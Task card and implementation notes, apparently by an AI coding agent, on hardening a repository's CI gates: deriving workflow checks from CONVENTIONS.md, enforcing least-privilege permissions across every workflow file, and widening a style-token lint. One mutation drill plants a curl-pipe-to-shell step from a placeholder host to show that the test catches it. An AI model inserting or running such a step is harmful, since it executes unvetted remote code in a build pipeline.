---
id: T-045
title: The gates cover the rules they enforce
feature: F-02
milestone: 4
priority: 23
size: M
status: building
blocked_by: []
touches: [tools/e2e/, .github/, docs/CONVENTIONS.md]
builder: claude-opus-5
verifier:
built_by: claude-opus-5 @fresh
verified_by:
review:
---

Absorbs: T-020-s6, T-036-s1, T-038-s2. Triage 2026-08-16: three
findings, one sentence — the enforcement is narrower than the
discipline it enforces, and each gap opens on the occasion the
discipline matters most. The parity spec mirrors CONVENTIONS instead
of parsing it; the least-privilege assertions read one hard-coded
workflow file; the token lint walks one directory. All three live in
tools/e2e and share the mutation-drill discipline T-020 established.
Launch-prep: these gates fire for real at the repo's first push.

Half of T-020-s6 is ALREADY DISCHARGED and this task does not carry
it: its sharpest paragraph said six of the sixteen hard-coded commands
point at a CONVENTIONS section that was still unwritten. The
integrator landed that text — docs/CONVENTIONS.md now carries the
tools/e2e command block, the `npm ci`-in-CI note and the PORT RULE
(verified at triage). What remains is the mirror-vs-parse hole.

## Acceptance criteria
- THE workflow parity spec SHALL DERIVE its expected commands from
  docs/CONVENTIONS.md "Build & test" rather than mirror them in a
  sixteen-entry array: every backticked command the doc lists for
  lib/parser, app, app/src-tauri and tools/e2e SHALL appear as a
  workflow step verbatim, with the TWO documented divergences
  (`npm ci` in CI where local says `npm install`; `npx playwright
  install --with-deps chromium`) expressed as an explicit, commented
  mapping rather than an untracked difference — so criterion 1 of
  T-020 ("command parity with CONVENTIONS") becomes literally true.
  IF parsing the section is judged too clever THEN the array stays
  AND docs/CONVENTIONS.md gains a pointer naming the spec by path;
  that arm is strictly weaker and SHALL be recorded as the arm taken.
- WHEN a command in docs/CONVENTIONS.md is reworded THEN the lane
  SHALL fail — a fixture SHALL prove it, since the whole defect is
  that today the workflow and the spec agree with each other while
  both are wrong.
- THE three least-privilege assertions SHALL run over EVERY file in
  .github/workflows/ (`*.yml` + `*.yaml`), not over the hard-coded
  ci.yml alone: a `permissions:` block present, exactly
  `{contents: read}` unless an explicit per-file exception table
  argues otherwise, and no job or step widening it. The remaining
  parity assertions (CONVENTIONS command verbatim + order, SHA pins,
  apt set, boot step) SHALL stay bound to ci.yml — they are facts
  about that one job, and the split is between "rules every workflow
  obeys" and "facts about the one CI job".
- WHEN a second workflow file is added with no `permissions:` block
  THEN the lane SHALL fail NAMING the file — a fixture SHALL prove
  it. The exception table SHALL carry scope, file and reason per
  entry, so a future release job's `contents: write` is argued in the
  test as well as in the workflow; zero-allowlist is not the honest
  target here, "no unargued grant" is.
- THE token lint's walk SHALL widen to app/test (and tools/e2e's
  fixtures if the same argument holds), keeping lib/parser OUT (no
  UI, ever — ADR-011) and keeping the lint's own script excluded
  DELIBERATELY rather than by file extension. T-038's measured
  122-file differential (`both=0 OLD-only=11 NEW-only=0`) is the
  standing evidence the widening is now safe; the lint SHALL be green
  on the widened corpus at ZERO allowlist. app/test is the one place a
  `text-red-500` can sit unnoticed while the shipped tree stays clean.
- THE `--selftest` sample set SHALL gain a positive/negative pair for
  each newly-covered surface, and `npm test`, `npm run typecheck`,
  `npm run lint:tokens` (+ `--selftest`) SHALL all be green.

Verification: headless — from tools/e2e/, with the mutation drills
recorded in notes the way T-020's seven were (each mutation caught by
exactly the intended assertion, each reverted). @human: none.

## Implementation notes

Built by claude-opus-5 @fresh on branch `t045-gates`, branch point
main@6ed97cf, in worktree /Users/ujju/Projects/nputer-t045. Three sibling
lanes were live (T-030 in lib/parser, T-034 in the map files, T-027 in
app-interview + app-shell); none of their worktrees was entered and the
diff touches nothing any of them owns. Main has since moved to c27c197
(T-050 merged, T-042 dispatched) — the merge-base is still 6ed97cf, and
the suites below are that point's, as dispatched.

**The whole diff, five files:**

    .github/workflows/ci.yml                     |  17 +-
    docs/CONVENTIONS.md                          |  29 +-
    tools/e2e/scripts/lint-tokens.mjs            | 214 ++++++-
    tools/e2e/tests/workflow-parity.spec.ts      | 553 ++++++++++----
    tools/e2e/tests/workflow-permissions.spec.ts | 351 +++++++++   (new)

plus this file and three suggestions. No new dependency: no package.json
and no lockfile moved (all four checked individually).

### Criterion 1 — ARM TAKEN: **DERIVE**, not the pointer

The strong arm. `workflow-parity.spec.ts` no longer carries the
sixteen-entry `EXPECTED_COMMANDS` array; it PARSES docs/CONVENTIONS.md
"Build & test" and builds the expectation from what it reads.

**The parse rule is the doc's own typography, and it is strict.** A
command bullet is one marked `run from <dir>/:`; the commands are the
`·`-separated segments after that marker, taking the FIRST backticked
span of each, and the list ENDS at the first segment that does not open
with a backtick. That last clause is what makes the tools/e2e bullet
parse correctly — its trailing `Exit 0 booted · 1 the boot failed · …`
legend is prose, and prose stops the list rather than joining it. Today
the parse yields exactly the four bullets and sixteen commands:

    lib/parser     npm ci · npx vitest run · npx tsc --noEmit · npm run build
    app            npm install · npm run build · npm test · npm run tauri dev · npm run tauri build
    app/src-tauri  cargo test · cargo audit
    tools/e2e      npm ci · npm test · npm run typecheck · npm run lint:tokens · npm run boot:check

Every one of the sixteen has a DISPOSITION in the spec — `verbatim` (11),
`mapped` (3), or `local-only` (2) — and the checks run in both directions:
a command in the doc with no disposition fails, and a disposition whose
command the doc no longer lists fails. The verbatim expectations are built
from the doc's own strings, not restated: `steps.push({dir: fromDoc.dir,
run: fromDoc.cmd})`. Two CI-only steps (`cargo install cargo-audit
--locked`, `npx playwright install --with-deps chromium`) complete the
17 expected steps; ci.yml has 19 run steps, the other two being
infrastructure (apt, `rustc --version`), enumerated with reasons so that
"every run step is either derived or argued" is a real assertion.

**The mapping is explicit and commented, and the doc has to carry it
too.** Each mapped/CI-only step and each local-only command must appear
backticked in CONVENTIONS' `- CI (…)` bullet — the one bullet whose reader
is the person about to edit ci.yml. A divergence the spec knows about and
the doc does not is precisely the "untracked difference" the criterion
forbids, so it is a failure.

**Finding, and why CONVENTIONS moved.** The criterion assumes TWO
documented divergences. The parse found FOUR, and the doc claimed two:

| # | CONVENTIONS says | CI runs | why |
|---|---|---|---|
| 1 | `npm install` (app) | `npm ci` | lockfile-exact installs in CI. Documented before. |
| 2 | (one-time) `npx playwright install chromium` | `npx playwright install --with-deps chromium` | Linux system libs. Documented before. |
| 3 | `npm run lint:tokens` (+ `-- --selftest`) | `node scripts/lint-tokens.mjs --selftest`, then `node scripts/lint-tokens.mjs` | the lint is CI's FIRST step, ahead of every `npm ci`; two steps because `--selftest` short-circuits the walk. **Was undocumented.** |
| 4 | `npm run boot:check` | `xvfb-run -a node tools/e2e/scripts/tauri-boot-check.mjs` (repo root) | a headless runner has no display. **Was undocumented.** |

So the CI bullet in docs/CONVENTIONS.md now enumerates all four, names
`cargo install cargo-audit --locked` as the CI-only addition, and says
that `npm run tauri dev` / `npm run tauri build` are deliberately NOT run.
This is the one edit outside tools/e2e and .github/, and it is the doc
being made TRUE rather than being written to fit the test: ci.yml's
commands were not changed to suit it. The four per-package command
bullets — the thing the derivation parses — are untouched.

**And the derivation immediately found a real hole.** CONVENTIONS lists
`npm run typecheck` for tools/e2e and **no CI step ran it**. The lane's
own typecheck was a documented gate the workflow skipped, invisible for as
long as the expectation was a mirror of the workflow. ci.yml gains an
`e2e types` step (after `npm ci`, before the 250MB browser download).
Drill 7b below proves the new step is bound: delete it and the lane reds
naming it. That hole is the whole argument for the derive arm over the
pointer arm, in one line of YAML.

### Criteria → evidence

| criterion | evidence |
|---|---|
| 1 — derive, with the divergences as an explicit commented mapping | above; `deriveExpectedSteps()` + `CI_SEQUENCE`/`LOCAL_ONLY` in workflow-parity.spec.ts; tests "the expected commands derive cleanly…", "every CONVENTIONS command is a step, verbatim and in CI order", "the workflow runs nothing beyond…". Arm recorded: **DERIVE**. |
| 2 — a reworded command reds the lane, proved by a fixture | four committed fixtures (reword / delete / undocumented divergence / restructured section) + live drills 1, 8, 9 |
| 3 — the three least-privilege assertions over EVERY workflow file, with an exception table | workflow-permissions.spec.ts: `workflowFiles()` over `*.yml` + `*.yaml`, `auditPermissions(files, EXCEPTIONS)`, `EXCEPTIONS` typed `{file, at, scope, level, reason}`. Parity assertions stayed on ci.yml — the split is two spec files. |
| 4 — a second workflow with no block fails NAMING the file, proved by a fixture | committed fixture + live drill 2 (a real second workflow file, then removed) |
| 5 — the lint's walk widens to app/test (+ tools/e2e), lib/parser OUT, self-exclusion DELIBERATE, green at zero allowlist | `WALK_ROOTS`/`WALK_ROOTS_OUT`/`WALK_EXTENSIONS`/`EXCLUDED_FILES` + obligation 3 below; drills 4, 5, 6 |
| 6 — `--selftest` gains a positive/negative pair per new surface; test/typecheck/lint all green | 6 new samples (43 → 49) + 14 walk-policy checks; obligations 1, 4, 6 |

### Proof obligations

**1. The full lane green.** `npm test` in tools/e2e: **50 passed (8.1s)**,
headless, one worker, retries 0, no skips — the 36 at branch point plus
**14 new**. The accounting: workflow-parity 6 → 11 (the T-036 permissions
test MOVED out; +2 live, +4 fixtures), workflow-permissions 9 (new file:
2 live, 7 fixtures). `npm run typecheck` clean.

**2. Mutation drills — one per new assertion, each caught by exactly the
intended assertion, each reverted with byte verification.** Every file
touched by a drill was restored from a pristine copy taken first and
`cmp`-verified after; `git status --porcelain` was empty between drills.

*Drill 1 — a reworded CONVENTIONS command* (`npx tsc --noEmit` →
`npx tsc --noEmit --incremental false`, in the live doc): **2 failed, 18
passed**. The intended assertion names BOTH sides:

    +   "docs/CONVENTIONS.md \"Build & test\" lists [lib/parser] npx tsc --noEmit --incremental false, which this spec has no entry for — add it to CI_SEQUENCE (verbatim or mapped, with the workflow step) or to LOCAL_ONLY with the reason CI does not run it.",
    +   "this spec expects [lib/parser] npx tsc --noEmit, which docs/CONVENTIONS.md \"Build & test\" no longer lists — the doc is the source of truth: a reworded or removed command means the workflow and this spec both need the same edit.",

The second failure is "the workflow runs nothing beyond the derived
commands and its infrastructure" — the reword drops the command from the
derivation, so ci.yml's `npx tsc --noEmit` step becomes unaccounted. That
is the correct consequence, and it is worth recording WHICH assertion did
NOT fire: "every CONVENTIONS command is a step, verbatim and in CI order"
**passed**, because a derivation that loses a command loses it from the
expectation too and the filtered order still matches. That silent pass is
exactly why the "nothing beyond" assertion earns its place. Reverted;
`cmp` byte-identical.

*Drill 2 — a second workflow file with no `permissions:` block.* A real
`.github/workflows/release.yml` (name/on/jobs/steps, no permissions key)
written to disk: **1 failed, 8 passed** in the permissions spec, and the
complaint NAMES the file:

    +   "release.yml: no top-level `permissions:` block — GITHUB_TOKEN would silently inherit the repository's default workflow-permission setting instead of being a fact in this repo. Declare `permissions: {contents: read}` under `name:` (T-036).",

ci.yml, which is fine, is not implicated. With that file still present the
parity spec was run separately: **11 passed** — the split holds, the ci.yml
facts are indifferent to a second workflow. File removed; `.github/
workflows/` back to `ci.yml` alone.

*Drill 3 — a job-level widening* (`jobs.linux.permissions: {contents:
read, packages: write}` in ci.yml): **1 failed, 19 passed** across both
specs, and only the intended one:

    +   "ci.yml: jobs.linux.permissions grants `packages: write` beyond the least-privilege default `{contents: read}`, and no exception row argues it. If the grant is genuinely needed, add it at THAT job's scope with its reason beside it in the workflow, and add a row (file, at, scope, level, reason) to EXCEPTIONS in tools/e2e/tests/workflow-permissions.spec.ts — never by widening a workflow default, which hands the scope to every job in the file."

Note what did NOT fire: the job's redundant `contents: read` is not
reported. The assertion names the widening, not the declaration. Reverted;
`cmp` byte-identical.

*Drill 4 — a `text-red-500` planted in app/test* (a `const PLANTED =
"text-red-500";` line in app/test/board-truth.test.tsx, transient in this
worktree only):

    app/test/board-truth.test.tsx:48: text-red-500  [P3: Tailwind default-palette utility (dead by mechanism here)]
    lint-tokens: 1 violation — tokens live in app/src/styles/tokens.css; …
    LINT_EXIT=1

and — the load-bearing half — the SAME planted violation under main's
script (`git show main:tools/e2e/scripts/lint-tokens.mjs`, run in place so
its `repoRoot` resolves identically): `lint-tokens: clean (38 files
scanned under app/src)`, **EXIT=0**. The widening is the difference
between a caught violation and a silent one. Reverted; `cmp`
byte-identical; clean run repeated. The planted line sits directly under
`type Field = [key: string, value: string | number];` at line 47, which is
NOT reported — the violation caught and the near-miss silent, in the same
file, in the same run.

*Drill 5 — an arbitrary value planted in a tools/e2e spec*
(`const PLANTED_LOCATOR = "p-[13px]";` appended to trusted-canary.spec.ts):
`tools/e2e/tests/trusted-canary.spec.ts:58: p-[13px] [P1: …]`, exit 1.
Reverted; `cmp` byte-identical.

*Drill 6 — the self-exclusion removed* (`EXCLUDED_FILES = []`): the lint
reports **29 violations against its own script** and the selftest fails
with `walk policy — tools/e2e/scripts/lint-tokens.mjs is excluded by
name`. The exclusion is load-bearing, not decorative.

*Drill 7 — a step smuggled into ci.yml* (`run: curl -sSfL
https://example.invalid/setup.sh | sh`): **1 failed** —

    +   "[(root)] curl -sSfL https://example.invalid/setup.sh | sh",

*Drill 7b — the newly added `e2e types` step deleted from ci.yml*: **1
failed** — `missing verbatim step: [tools/e2e] npm run typecheck`. The
step this task added is genuinely bound.

*Drills 8 and 9 — the CI bullet stops carrying a disposition.* Rewording
"deliberately does NOT run `npm run tauri dev` or `npm run tauri build`"
into prose: **1 failed**, naming both local-only commands ("an omission a
reader cannot tell from a mistake"). Deleting the CI bullet entirely: the
derivation reports "has no `- CI (.github/workflows/ci.yml)` bullet — that
bullet is where every divergence … has to be written down". Reverted;
`cmp` byte-identical.

**3. The widened lint, green at ZERO allowlist over the new corpus.**

    lint-tokens: clean (90 files scanned under app/src, app/test, tools/e2e)   exit 0

90 files = 38 app/src + 31 app/test + 21 tools/e2e, minus the one
by-name exclusion. **Zero hits, zero allowlist, nothing excluded to make
it green** — the only exclusion is the lint's own script, and it is
excluded for a reason that is asserted rather than asserted-and-hoped
(drill 6). Nothing was found in app/test that I declined to fix, because
nothing was found: the criterion's "green at zero allowlist" is MET.

The standing evidence the criterion cites, re-measured on the exact new
corpus rather than inherited: the pre-T-038 line-based scan versus the
shipped masked scan over the 51 newly walked files —

    files=51  both=0  OLD-only=8  NEW-only=0

All 8 OLD-only hits are TypeScript LABELED TUPLES in app/test, the third
collision class T-038 catalogued — `[id: string, spec: ComponentSpec]`,
`[key: string, value: string | number]`, `[pattern: string, text: string,
expected: boolean]` across six files. Before T-038 this widening would
have redded main on eight false positives; after it, none. Two of those
exact lines are now selftest negatives.

Forward-looking, for the integrator: the same widened scan over CURRENT
main (c27c197, which has T-050's app/test churn) is **92 files, 0 hits**.
The gate will not red on merge.

lib/parser stays OUT (ADR-011: no UI, ever) and that is asserted, not
merely omitted — `WALK_ROOTS_OUT` plus a selftest check per entry;
drill L8 shows adding it fails. `.mjs` was ADDED to the walked extensions
on purpose: without it the lint's own script would be excluded by file
extension, which is the accident criterion 5 asks to be turned into a
decision.

**4. `--selftest` green with its new pairs.**

    lint-tokens selftest: 49 samples green, 14 walk-policy checks green

43 → **49 samples**, one positive/negative pair per newly covered surface:

| surface | positive | negative(s) |
|---|---|---|
| app/test | `expect(card.className).toContain("bg-red-500");` — a unit test pinning a dead utility, the exact thing that can sit in app/test while app/src stays clean | `type Field = [key: string, value: string \| number];` and `const cases: [pattern: string, text: string, expected: boolean][] = [];` — labeled tuples verbatim from app/test, the measured collision class |
| tools/e2e | `await page.locator(".text-red-500").first().click();` — a lane spec asserting a default-palette class | `await page.locator('[data-testid="task-card"][data-task-id="T-101"]').click();` (the lane's own selector idiom, verbatim shape from helpers.ts:42) and `expect(stderr).toContain("[boot-check] REFUSED:");` (a bracketed token sharing a line with a colon — P2's near-miss) |
| the walk itself (.mjs + the by-name exclusion) | not expressible as a text sample — a walk is not a string, so it gets **14 walk-policy checks** instead: three required trees walked non-trivially, three declared roots non-empty, four argued-out trees absent, `.mjs` walked, the script excluded by name, the exclusion load-bearing (25 hits if walked), node_modules never walked |

**5. Every new test executes — 15 spec mutations + 11 lint mutations, each
red, each reverted byte-exact.** One targeted mutation per new test body,
run as `npx playwright test <the spec>`; every one produced exactly
**1 failed** and reddened the NAMED test (titles read off the output, not
inferred from the count), and every file was restored from a pristine copy
with a sha256 match afterwards:

    P1 "derive cleanly"                             1 failed / 10 passed
    P2 "nothing beyond"                             1 failed / 10 passed
    P3 FIXTURE reword                               1 failed / 10 passed
    P4 FIXTURE delete                               1 failed / 10 passed
    P5 FIXTURE undocumented divergence              1 failed / 10 passed
    P6 FIXTURE restructured section                 1 failed / 10 passed
    M1 "glob is not vacuous"                        1 failed /  8 passed
    M2 "least privilege, live"                      1 failed /  8 passed
    M3 FIXTURE no permissions block                 1 failed /  8 passed
    M4 FIXTURE .yaml too                            1 failed /  8 passed
    M5 FIXTURE job/step widening                    1 failed /  8 passed
    M6 FIXTURE write-all                            1 failed /  8 passed
    M7 FIXTURE redundant/empty are not widenings    1 failed /  8 passed
    M8 FIXTURE exception row + stale row            1 failed /  8 passed
    M9 FIXTURE empty enumeration                    1 failed /  8 passed

and for the lint, six sample-expectation flips (L1–L6, each failing with
the sample quoted and the matched-vs-expected patterns named) plus five
walk-policy mutations (L7 app/test dropped, L8 lib/parser added, L9 .mjs
dropped, L10 self-exclusion removed, L11 node_modules unskipped) — all
exit 1 with the failing rule named, all restored byte-exact.

**The drill that found a hole in its own subject, worth recording.** L7's
first run came back **exit 0, "10 walk-policy checks green"**: the
positive checks were GENERATED from `WALK_ROOTS`, so deleting a root
deleted its own check. A gate that cannot notice its own scope shrinking
is the failure mode this whole task is about, reproduced inside the fix.
`MUST_COVER` is now a separate list — the requirement, deliberately not
derived from the policy that satisfies it — and L7 re-run fails with
`required tree app/test is walked (0 files)`. Two lists that must agree is
the right shape exactly when one of them is the thing under test.

**6. Suites, all at branch-point counts.**

| suite | result |
|---|---|
| lib/parser `npx vitest run` | **159 passed** (10 files); `npx tsc --noEmit` clean |
| app `npm run build` then `npm test` | build ✓; **507 passed** (30 files) |
| app/src-tauri `cargo test` | **217 passed, 0 failed, 3 ignored** — summed across all 11 `test result:` lines (105+0+0+32+68+3+7+0+2+0+0), full output captured to a file rather than `tail`ed (the truncation trap T-020's notes record) |
| tools/e2e `npm test` | **50 passed** (36 + 14) |
| tools/e2e `npm run typecheck` | clean |
| tools/e2e `npm run lint:tokens` | `clean (90 files scanned under app/src, app/test, tools/e2e)`, exit 0 |
| tools/e2e `npm run lint:tokens -- --selftest` | `49 samples green, 14 walk-policy checks green`, exit 0 |

**7. Fence.** `git diff --stat 6ed97cf..HEAD` is the five files listed at
the top. Against the branch point, `git diff --stat` is **EMPTY** for
every one of `app/` (all of it — src, test, src-tauri), `lib/parser`,
`method`, `docs/architecture`, `app/package-lock.json`,
`lib/parser/package-lock.json`, `tools/e2e/package-lock.json`,
`app/src-tauri/Cargo.lock` and `tools/e2e/package.json`. `git status
--porcelain` is empty. The transient drills touched
app/test/board-truth.test.tsx and tools/e2e/tests/trusted-canary.spec.ts;
both were `git checkout`-reverted and `cmp`-verified byte-identical, and
neither appears in the diff. Neither ../nputer-t030 nor ../nputer-t034 nor
any t027 worktree was entered.

**Graph — a verified no-op, not a skipped step.** NOT regenerated, as
dispatched. `cargo test -p nputer-index --test self_graph -- --ignored` →
`test self_graph_is_current ... ok`, and `git status --short
docs/architecture/` is empty. `.nputerignore` line 8 is `tools/` and line
3 is `docs/`, so a diff confined to tools/**, docs/** and .github/** moves
nothing in the committed graph — the T-009-s1 regen ritual is a no-op for
this merge, which is the expected outcome.

### Deliberate deltas a verifier should check rather than assume

- **docs/CONVENTIONS.md is in the diff** although the card's `touches`
  said `[tools/e2e/]`. The criterion's weak arm explicitly contemplates a
  CONVENTIONS edit; the strong arm needs one for a different reason —
  divergences 3 and 4 were undocumented, and the derivation requires every
  divergence to be documented where its reader will meet it. Only the CI
  bullet changed; the four command bullets the parse reads are untouched.
  `touches` updated to `[tools/e2e/, .github/, docs/CONVENTIONS.md]` so it
  tells the truth (T-009/T-020 precedent).
- **ci.yml gained a step** (`e2e types`) and one comment fix (the T-036
  rule comment pointed at workflow-parity.spec.ts for a rule that now
  lives in workflow-permissions.spec.ts). No SHA, no existing command, no
  ordering, no trigger, no runner, no timeout, no `permissions:` value
  changed.
- **The permissions test MOVED files.** T-036's single test is gone from
  workflow-parity.spec.ts and its generalised successor is in
  workflow-permissions.spec.ts. A verifier diffing the parity spec alone
  will see an assertion "deleted"; it is two files over, covering strictly
  more.
- **`--selftest` now reads the tree.** The walk-policy checks call
  `corpus()`, so `--selftest` is no longer purely tree-independent. It is
  still zero-dep and still runs against a bare checkout (CI's first step
  is unaffected), but a broken checkout now reds the selftest as well as
  the lint. Deliberate: the walk policy is not assertable any other way.
- **The exception table ships EMPTY.** Nothing in ci.yml needs more than
  `contents: read`, so an entry today would be a lie. Its per-row
  machinery is exercised by fixtures instead — argued row passes, wrong
  file does not transfer, stale row is itself a failure — which is how an
  empty table can still be trusted.
- **A second workflow file was written to disk and removed** during drill
  2. `.github/workflows/` contains `ci.yml` alone; the workflow stays
  dormant and the repo still has no remote.

### Honest limits

- The workflow remains **honestly unverified against a live runner**
  (T-020 §1 tier 3). Everything here validates the artifact, not a run.
  The new `e2e types` step in particular has never executed on a runner.
- The parse binds the doc's TYPOGRAPHY: `run from <dir>/:`, backticks,
  `·` separators. A future editor reformatting the section reds the lane —
  loudly, naming what it can no longer find, which is the intended
  direction — but it is a coupling worth knowing about. The CI bullet says
  the spec derives from those bullets, which is the warning a reader gets.
- The permissions rules read `.github/workflows/*.y{a,}ml` only: composite
  actions and caller/callee reusable-workflow grants are outside them
  (filed T-045-s3).
- `cargo audit` was not run here (unchanged by this diff; the AUDIT GATE
  POLICY bullet holds).
- **The boot check was NOT run, and its gate does not fire**: the BOOT
  GATE trigger is a diff touching `app/src-tauri/**`, `app/src/**` or
  either manifest, and this diff touches none of them. Not a skipped gate
  — an untriggered one. Nothing in this session bound, connected to or
  signalled port 1420; the lane owned 14520 by construction, and no window
  was ever opened. No screenshots, no OS input, no model calls, no GitHub
  API calls, no remote.

### Suggestions filed

- **T-045-s1** — CI could invoke `npm run lint:tokens` and
  `xvfb-run -a npm run boot:check` and shrink four divergences to the two
  the doc originally claimed. Not done here: changing a dormant workflow's
  commands to shorten a test's table is the wrong direction of causation.
- **T-045-s2** — importing lint-tokens.mjs runs the whole tree lint as a
  side effect and can `process.exit(1)` the importer; two tasks in a row
  (T-038, T-045) have now worked around it while gathering evidence.
- **T-045-s3** — composite actions and reusable-workflow grants escape the
  generalised permissions rules; cheapest to note while the repo has no
  instance of either.

## Verdicts
